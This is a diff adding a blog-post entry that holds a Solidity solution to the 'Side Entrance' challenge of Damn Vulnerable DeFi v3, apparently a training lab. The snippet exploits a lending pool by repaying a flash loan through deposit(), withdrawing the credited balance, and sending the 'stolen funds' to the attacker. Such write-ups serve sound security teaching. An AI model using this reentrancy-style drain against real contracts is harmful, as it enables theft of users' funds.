@@ -67,5 +67,31 @@ contract Attack {
 });`,
             ],
         },
+        {
+            id: "damn-vulnerable-defi-solutions-4-side-entrance",
+            title: `Damn Vulnerable DeFi v3 Solutions 4: Side Entrance`,
+            description: `Solution for the 4th Damn Vulnerable DeFi v3 challenge.`,
+            date: "January 12, 2023",
+            snippets: [
+                `function exploit() public {
+    //pool.flashLoan() will make a call to 'execute()' function where we exploit the contract
+    pool.flashLoan(1000 ether);
+    //Withdraw the credited balance to this contract
+    pool.withdraw();
+    //Transfer the stolen funds to attacker's EOA
+    receiver.transfer(address(this).balance);
+}
+
+//calback function. Called by SideEntranceLenderPool::flashLoan
+function execute() public payable {
+    //return the flash loan using 'deposit()' function.
+    //Using 'deposit()' will credit this contract for the amount of FL
+    pool.deposit{value: address(this).balance}();
+}
+
+//This is necessary for the contract to be able to receive ETH
+receive() external payable {}`,
+            ],
+        },
     ],
 };
